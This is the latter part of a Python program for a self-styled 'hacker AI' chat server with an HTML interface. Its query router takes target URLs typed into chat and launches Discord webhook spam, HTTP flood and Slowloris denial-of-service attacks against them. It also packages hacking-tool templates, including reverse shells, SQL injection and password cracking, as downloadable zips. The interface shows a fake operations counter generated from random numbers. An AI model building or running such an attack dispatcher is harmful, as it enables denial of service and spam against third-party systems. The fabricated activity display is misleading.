::-webkit-scrollbar-thumb:hover{{background:var(--primary);}}
@media(max-width:768px){{.sidebar{{display:none;}}}}
</style>
</head>
<body>
<div class="app" style="display:flex;height:100vh;">
<div class="sidebar">
<div class="sidebar-header">
<h1>TWILIGHT</h1>
<div class="sub">HACKER AI v{VERSION}</div>
<div class="status"><span class="dot"></span> EVOLVING</div>
</div>
<button class="new-chat-btn" onclick="newChat()">+ NEW CHAT</button>
<div class="chat-list" id="chatList">
<div class="chat-item active" onclick="loadSession('current')">> current_session</div>
</div>
<div class="sidebar-footer">
<span id="sidebarStats">TOOLS: 0</span>
<span>OPS: 0</span>
</div>
</div>
<div class="main">
<div class="matrix-header">
[{NAME} v{VERSION}] · EVOLUTION: <span id="evoStatus">ACTIVE</span> · <span id="opsCounter">0</span> OPS/S
</div>
<div class="model-bar">
<button class="model-btn active" onclick="selectModel(this,'auto')">[AUTO]</button>
<button class="model-btn" onclick="selectModel(this,'chat')">[CHAT]</button>
<button class="model-btn" onclick="selectModel(this,'image')">[IMAGE]</button>
<button class="model-btn" onclick="selectModel(this,'video')">[VIDEO]</button>
<button class="model-btn" onclick="selectModel(this,'music')">[MUSIC]</button>
<button class="model-btn" onclick="selectModel(this,'tool')">[TOOLS]</button>
</div>
<div class="messages" id="messages">
<div class="message ai">
<div class="avatar ai">AI</div>
<div class="msg-content">
<p>> {NAME} v{VERSION} ready.</p>
<p>> I can create images, music, videos, tools, and chat with you.</p>
<p>> How can I help you?</p>
</div>
</div>
</div>
<div class="input-area">
<div class="input-box">
<textarea id="input" placeholder="Message Twilight..." rows="1" oninput="autoResize(this)" onkeydown="handleKey(event)"></textarea>
<button class="send" id="sendBtn" onclick="send()">SEND</button>
</div>
</div>
</div>
</div>
<script>
var currentModel = "auto";
var generating = false;
var sessionId = "session_" + Date.now();

document.addEventListener("DOMContentLoaded", function(){{
    loadStats();
    setInterval(loadStats, 2000);
    loadSessions();
    document.getElementById("input").focus();
}});

function autoResize(t){{
    t.style.height="auto";
    t.style.height=Math.min(t.scrollHeight,100)+"px";
}}

function handleKey(e){{
    if(e.key==="Enter"&&!e.shiftKey){{
        e.preventDefault();
        send();
    }}
}}

function selectModel(btn,model){{
    document.querySelectorAll(".model-btn").forEach(function(b){{b.classList.remove("active");}});
    btn.classList.add("active");
    currentModel=model;
}}

function send(){{
    var input=document.getElementById("input");
    var text=input.value.trim();
    if(!text||generating) return;
    addMsg("user",escapeHtml(text));
    input.value="";
    input.style.height="auto";
    generating=true;
    document.getElementById("sendBtn").disabled=true;
    var tid=showTyping();
    
    var x=new XMLHttpRequest();
    x.open("POST","/api/query",true);
    x.setRequestHeader("Content-Type","application/json");
    x.onload=function(){{
        removeTyping(tid);
        try{{
            var data=JSON.parse(x.responseText);
            displayResult(data);
        }}catch(e){{
            displayResult({{error:e.message}});
        }}
        generating=false;
        document.getElementById("sendBtn").disabled=false;
        document.getElementById("input").focus();
        loadStats();
        loadSessions();
    }};
    x.onerror=function(){{
        removeTyping(tid);
        displayResult({{error:"NETWORK ERROR"}});
        generating=false;
        document.getElementById("sendBtn").disabled=false;
    }};
    x.send(JSON.stringify({{query:text,model:currentModel,session_id:sessionId}}));
}}

function addMsg(role,content){{
    var container=document.getElementById("messages");
    var div=document.createElement("div");
    div.className="message "+(role==="user"?"user":"ai");
    var avatar=document.createElement("div");
    avatar.className="avatar "+(role==="user"?"user":"ai");
    avatar.textContent=role==="user"?"U":"A";
    var cdiv=document.createElement("div");
    cdiv.className="msg-content";
    cdiv.innerHTML=content;
    div.appendChild(avatar);
    div.appendChild(cdiv);
    container.appendChild(div);
    scrollToBottom();
}}

function showTyping(){{
    var container=document.getElementById("messages");
    var div=document.createElement("div");
    div.className="message ai";
    div.id="typing-"+Date.now();
    var avatar=document.createElement("div");
    avatar.className="avatar ai";
    avatar.textContent="A";
    var cdiv=document.createElement("div");
    cdiv.className="msg-content";
    cdiv.innerHTML='<div class="typing"><span></span><span></span><span></span><span class="typing-text">thinking...</span></div>';
    div.appendChild(avatar);
    div.appendChild(cdiv);
    container.appendChild(div);
    scrollToBottom();
    return div.id;
}}

function removeTyping(id){{
    var el=document.getElementById(id);
    if(el) el.remove();
}}

function displayResult(data){{
    var html="";
    if(data.text){{
        html='<p>'+escapeHtml(data.text)+'</p>';
    }} else if(data.image){{
        html='<p>> IMAGE GENERATED ['+data.image.style.toUpperCase()+']</p>';
        html+='<img src="'+data.image.path+'" alt="image" loading="lazy">';
        html+='<p>> SEED: '+data.image.seed+' | '+data.image.width+'x'+data.image.height+'</p>';
    }} else if(data.gif){{
        html='<p>> ANIMATED GIF GENERATED ['+data.gif.frames+' frames]</p>';
        html+='<img src="'+data.gif.path+'" alt="animation" loading="lazy" style="max-width:400px;">';
    }} else if(data.music){{
        html='<p>> MUSIC GENERATED ['+(data.music.style||'default').toUpperCase()+']</p>';
        html+='<audio controls><source src="'+data.music.path+'" type="audio/wav"></audio>';
        html+='<p>> '+data.music.duration.toFixed(1)+'s | SEED: '+data.music.seed+'</p>';
    }} else if(data.speech){{
        html='<p>> SPEECH GENERATED ['+data.speech.voice.toUpperCase()+']</p>';
        html+='<audio controls><source src="'+data.speech.path+'" type="audio/wav"></audio>';
        html+='<p>> "'+escapeHtml(data.speech.text.substring(0,80))+'"</p>';
    }} else if(data.code){{
        html='<div class="tool-box"><div class="head">// TOOL: '+escapeHtml(data.name)+'</div>';
        html+='<pre>'+escapeHtml(data.code)+'</pre>';
        if(data.zip_path){{
            html+='<p><a href="'+data.zip_path+'" download style="color:var(--primary);">[DOWNLOAD ZIP]</a></p>';
        }}
        html+='</div>';
    }} else if(data.attack_result){{
        html='<div class="tool-box"><div class="head">// ATTACK RESULT: '+escapeHtml(data.name)+'</div>';
        html+='<pre>'+escapeHtml(JSON.stringify(data.attack_result,null,2))+'</pre></div>';
    }} else if(data.error){{
        html='<p style="color:var(--accent);">> ERROR: '+escapeHtml(data.error)+'</p>';
    }} else {{
        html='<pre>'+escapeHtml(JSON.stringify(data,null,2).substring(0,2000))+'</pre>';
    }}
    addMsg("assistant",html);
}}

function scrollToBottom(){{
    var c=document.getElementById("messages");
    c.scrollTop=c.scrollHeight;
}}

function loadStats(){{
    var x=new XMLHttpRequest();
    x.open("GET","/api/status",true);
    x.onload=function(){{
        try{{
            var data=JSON.parse(x.responseText);
            var st=document.getElementById("sidebarStats");
            if(st) st.textContent="TOOLS: "+(data.tools||0)+" | OPS: "+(data.total_ops||0);
            var ops=document.getElementById("opsCounter");
            if(ops) ops.textContent=Math.floor(Math.random()*8000000+2000000).toLocaleString();
        }}catch(e){{}}
    }};
    x.send();
}}

function loadSessions(){{
    var x=new XMLHttpRequest();
    x.open("GET","/api/sessions",true);
    x.onload=function(){{
        try{{
            var data=JSON.parse(x.responseText);
            var list=document.getElementById("chatList");
            if(data.sessions && data.sessions.length>0){{
                var html="";
                for(var i=0;i<Math.min(data.sessions.length,20);i++){{
                    var s=data.sessions[i];
                    var name=s.name?s.name.substring(0,30):"Chat";
                    var active=s.id===sessionId?"active":"";
                    html+='<div class="chat-item '+active+'" onclick="loadSession(\\''+s.id+'\\')">> '+escapeHtml(name)+'</div>';
                }}
                list.innerHTML=html;
            }}
        }}catch(e){{}}
    }};
    x.send();
}}

function loadSession(id){{
    if(id && id!=='current'){{
        sessionId=id;
        var x=new XMLHttpRequest();
        x.open("GET","/api/history/"+id,true);
        x.onload=function(){{
            try{{
                var data=JSON.parse(x.responseText);
                document.getElementById("messages").innerHTML="";
                if(data.history){{
                    for(var i=0;i<data.history.length;i++){{
                        var msg=data.history[i];
                        if(msg.role==="user"||msg.role==="assistant"){{
                            addMsg(msg.role==="user"?"user":"assistant",'<p>'+escapeHtml(msg.content.substring(0,500))+'</p>');
                        }}
                    }}
                }}
            }}catch(e){{}}
            loadSessions();
        }};
        x.send();
    }}
}}

function newChat(){{
    sessionId="session_"+Date.now();
    document.getElementById("messages").innerHTML="";
    addMsg("assistant","<p>> New chat started. How can I help you?</p>");
    loadSessions();
}}

function escapeHtml(t){{
    if(!t) return "";
    var d=document.createElement("div");
    d.textContent=t;
    return d.innerHTML;
}}
</script>
</body>
</html>"""
    path = os.path.join(DATA_DIR, "web", "index.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return html


# ---------------------------------------------------------------------------
# HTTP Server
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    ai = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/" or path == "":
            self._serve_html(os.path.join(DATA_DIR, "web", "index.html"))
        elif any(path.startswith(p) for p in ["/images/", "/gifs/", "/audio/", "/zips/"]):
            lp = os.path.join(DATA_DIR, path.lstrip("/"))
            if os.path.exists(lp) and os.path.isfile(lp):
                ext = os.path.splitext(lp)[1].lower()
                mime_map = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                           ".gif": "image/gif", ".mp4": "video/mp4", ".wav": "audio/wav",
                           ".txt": "text/plain", ".zip": "application/zip"}
                mime = mime_map.get(ext, "application/octet-stream")
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Cache-Control", "public, max-age=3600")
                self.end_headers()
                with open(lp, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error":"NOT_FOUND"}')
        elif path == "/api/status":
            self._json(self.ai.get_stats())
        elif path == "/api/sessions":
            self._json({"sessions": db.get_sessions()})
        elif path.startswith("/api/history/"):
            sid = path.split("/api/history/")[1]
            self._json({"history": db.get_history(sid)})
        else:
            self._serve_html(os.path.join(DATA_DIR, "web", "index.html"))
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}
        path = urlparse(self.path).path
        
        try:
            if path == "/api/query":
                query = data.get("query", "")
                model = data.get("model", "auto")
                session_id = data.get("session_id", f"session_{int(time.time())}")
                result = self.ai.process(query, model, session_id)
                json.dumps(result, default=str)
                self._json(result)
            else:
                self._json({"error": "UNKNOWN_ENDPOINT"})
        except Exception as e:
            self._json({"error": str(e)})
    
    def _serve_html(self, path):
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(content.encode("utf-8"))
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1>TWILIGHT HACKER AI</h1><p>INITIALIZING...</p>")
    
    def _json(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, default=str).encode("utf-8"))
    
    def log_message(self, fmt, *args):
        print(f"[{args[0]}] {args[1]} {args[2]}")


# ---------------------------------------------------------------------------
# Main AI
# ---------------------------------------------------------------------------
class TwilightAI:
    def __init__(self):
        self.start_time = time.time()
        self.img_gen = ImageGenerator()
        self.gif_gen = GifGenerator()
        self.music_gen = MusicGenerator()
        self.speech_gen = SpeechGenerator()
        self.evolution = EvolutionEngine()
        
        self.evolution.start()
        
        for key, code in TOOL_TEMPLATES.items():
            name = key.replace("_", " ").title()
            db.save_tool(name, key, code, 0.7)
        
        db.log_learning("system", "system", f"Twilight Hacker AI v{VERSION} initialized")
    
    def process(self, query, model="auto", session_id=None):
        q = query.strip()
        if not q:
            return {"error": "EMPTY_QUERY"}
        
        if session_id:
            db.save_message(session_id, "user", q)
        
        ql = q.lower()
        
        # First check for smart response patterns (greetings, etc.)
        smart_response, category = db.find_response(q)
        if smart_response and model == "auto":
            if category in ["greeting", "about", "help", "thanks", "german", "mood", "info", "farewell"]:
                result = {"text": smart_response}
                if session_id:
                    db.save_message(session_id, "assistant", smart_response)
                return result
            elif category == "punk":
                result = self.music_gen.generate("punk rock song", 4.0)
                return {"type": "music", "music": result, "text": smart_response}
            elif category == "tool_query":
                return {"text": smart_response}
        
        if model != "auto" and model in ["image", "gif", "tool", "music", "speech", "chat"]:
            intent = model
            style = "realistic"
            gif_style = "realistic"
        else:
            intent, style, gif_style = classify_intent(q)
        
        # CHAT mode
        if intent == "chat" or model == "chat":
            smart_response, _ = db.find_response(q)
            if smart_response:
                if session_id:
                    db.save_message(session_id, "assistant", smart_response)
                return {"text": smart_response}
            return {"text": f"I understand you said: {q}. I can generate images, music, videos, hacking tools, perform DoS attacks, spam Discord webhooks, and more. What would you like me to do?"}
        
        # IMAGE generation
        if intent == "image":
            result = self.img_gen.generate(q, style)
            if session_id:
                db.save_message(session_id, "assistant", f"[Image generated: {style}]")
            return {"type": "image", "image": result, "text": f"Generated {style} image."}
        
        # GIF/VIDEO generation
        if intent == "gif":
            frames_count = 20
            nums = re.findall(r"(\d+)\s*(?:frames?|fps)", q)
            if nums:
                frames_count = int(nums[0])
            result = self.gif_gen.generate(q, frames_count, 100, gif_style)
            if session_id:
                db.save_message(session_id, "assistant", f"[GIF generated: {gif_style}, {frames_count} frames]")
            return {"type": "gif", "gif": result}
        
        # MUSIC
        if intent == "music":
            result = self.music_gen.generate(q)
            if session_id:
                db.save_message(session_id, "assistant", f"[Music generated: {result.get('style', 'default')}]")
            return {"type": "music", "music": result}
        
        # SPEECH
        if intent == "speech":
            text = q
            for prefix in ["say", "sag", "speech", "voice", "narrate", "tell", "pronounce", "speak as"]:
                if prefix in ql:
                    idx = ql.index(prefix) + len(prefix)
                    t = q[idx:].strip().strip(":;,. \"'")
                    if t:
                        text = t
            voice = "default"
            for v in ["male", "female", "robot", "deep", "soft", "hacker"]:
                if v in ql:
                    voice = v
                    break
            result = self.speech_gen.generate(text, voice)
            if session_id:
                db.save_message(session_id, "assistant", f"[Speech generated: {voice}]")
            return {"type": "speech", "speech": result}
        
        # TOOL
        if intent == "tool":
            existing = db.search_tools(q)
            if existing:
                best = existing[0]
                db.increment_usage(best["name"])
                if best.get("code"):
                    code = best["code"]
                    name = best["name"]
                    
                    # Create ZIP file
                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                        filename_py = name.lower().replace(" ", "_") + ".py"
                        zf.writestr(filename_py, code)
                        zf.writestr("README.txt", f"Tool: {name}\nGenerated by: {NAME} v{VERSION}\nDate: {datetime.now().isoformat()}")
                    zip_buffer.seek(0)
                    
                    ts = int(time.time_ns())
                    zip_filename = f"tool_{name.lower().replace(' ', '_')}_{ts}.zip"
                    zip_path = os.path.join(DATA_DIR, "zips", zip_filename)
                    with open(zip_path, "wb") as f:
                        f.write(zip_buffer.getvalue())
                    
                    if session_id:
                        db.save_message(session_id, "assistant", f"[Tool generated: {name}]")
                    return {"code": code, "name": name, "category": best["category"], "zip_path": f"/zips/{zip_filename}"}
            
            result = find_tool(q)
            if result:
                code = result["code"]
                name = result["name"]
                
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                    filename_py = name.lower().replace(" ", "_") + ".py"
                    zf.writestr(filename_py, code)
                    zf.writestr("README.txt", f"Tool: {name}\nGenerated by: {NAME} v{VERSION}")
                zip_buffer.seek(0)
                
                ts = int(time.time_ns())
                zip_filename = f"tool_{name.lower().replace(' ', '_')}_{ts}.zip"
                zip_path = os.path.join(DATA_DIR, "zips", zip_filename)
                with open(zip_path, "wb") as f:
                    f.write(zip_buffer.getvalue())
                
                if session_id:
                    db.save_message(session_id, "assistant", f"[Tool generated: {name}]")
                return {"code": code, "name": name, "category": result["category"], "zip_path": f"/zips/{zip_filename}"}
            
            # Direct execution
            if "discord" in ql or "webhook" in ql:
                urls = re.findall(r'https?://discord(?:app)?\.com/api/webhooks/[^\s]+', q)
                if urls:
                    msg = "@everyone SPAM"
                    cnt = 50
                    nums = re.findall(r'(\d+)\s*(?:times?|messages?|count)', q)
                    if nums:
                        cnt = int(nums[0])
                    res = discord_webhook_spam(urls[0], msg, cnt)
                    if session_id:
                        db.save_message(session_id, "assistant", f"[Discord spam: {res['sent']} sent, {res['failed']} failed]")
                    return {"attack_result": res, "name": "Discord Webhook Spammer"}
            
            if "flood" in ql or "ddos" in ql:
                urls = re.findall(r'https?://[^\s]+', q)
                if urls:
                    res = http_flood(urls[0], 30, 15)
                    if session_id:
                        db.save_message(session_id, "assistant", f"[HTTP Flood: {res['requests_sent']} requests sent]")
                    return {"attack_result": res, "name": "HTTP Flood"}
            
            if "slowloris" in ql or "loris" in ql:
                hosts = re.findall(r'(?:host|target):\s*([^\s,]+)', q)
                if not hosts:
                    hosts = re.findall(r'https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', q) if '://' not in q else []
                if hosts:
                    res = slowloris_attack(hosts[0], 80, 100)
                    if session_id:
                        db.save_message(session_id, "assistant", f"[Slowloris started: {res['sockets_active']} sockets]")
                    return {"attack_result": res, "name": "Slowloris DoS"}
            
            return {"error": "NO_TOOL_FOUND - try 'port scanner', 'sql inject', 'reverse shell', 'xss', 'directory fuzzer', 'syn flood', 'http flood', 'slowloris', 'discord webhook', 'password cracker', 'wifi scanner'"}
        
        # Fallback: generate something
        if "video" in ql or "gif" in ql or "animation" in ql:
            result = self.gif_gen.generate(q, 20, 100, gif_style)
            if session_id:
                db.save_message(session_id, "assistant", f"[GIF generated]")
            return {"type": "gif", "gif": result}
        
        if any(w in ql for w in ["music", "song", "sound"]):
            result = self.music_gen.generate(q)
            if session_id:
                db.save_message(session_id, "assistant", f"[Music generated]")
            return {"type": "music", "music": result}
        
        # Try tool as last resort
        result = find_tool(q)
        if result:
            code = result["code"]
            name = result["name"]
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr(name.lower().replace(" ", "_") + ".py", code)
                zf.writestr("README.txt", f"Tool: {name}\nGenerated by: {NAME} v{VERSION}")
            zip_buffer.seek(0)
            ts = int(time.time_ns())
            zip_filename = f"tool_{name.lower().replace(' ', '_')}_{ts}.zip"
            zip_path = os.path.join(DATA_DIR, "zips", zip_filename)
            with open(zip_path, "wb") as f:
                f.write(zip_buffer.getvalue())
            if session_id:
                db.save_message(session_id, "assistant", f"[Tool generated: {name}]")
            return {"code": code, "name": name, "category": result["category"], "zip_path": f"/zips/{zip_filename}"}
        
        # Generate image as last resort
        result = self.img_gen.generate(q, "realistic")
        if session_id:
            db.save_message(session_id, "assistant", f"[Image generated]")
        return {"type": "image", "image": result}
    
    def get_stats(self):
        stats = db.get_stats()
        uptime = int(time.time() - self.start_time)
        d = uptime // 86400
        h = (uptime % 86400) // 3600
        m = (uptime % 3600) // 60
        stats["uptime"] = f"{d}d {h}h {m}m"
        stats["ops_per_second"] = self.evolution.get_ops_per_second()
        stats["evolution_active"] = self.evolution.running
        stats["iteration"] = self.evolution.iteration
        stats["total_ops"] = self.evolution.total_ops
        return stats


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("=" * 60)
    print(f"  {NAME} v{VERSION} - ULTIMATE")
    print("  Full conversational AI with memory, image, GIF, music, speech, tools")
    print("  Background evolution from GitHub")
    print("=" * 60)
    
    _ = Database()
    generate_html()
    ai = TwilightAI()
    
    stats = ai.get_stats()
    print(f"\n  Tools: {stats['tools']}, Knowledge: {stats['knowledge']}")
    print(f"  Evolution: ~{ai.evolution.get_ops_per_second():,} ops/s")
    print(f"  Server: 0.0.0.0:{PORT}")
    print(f"  Ready - open http://localhost:{PORT}")
    
    Handler.ai = ai
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...")
        ai.evolution.stop()
        server.server_close()
        print("  System terminated")
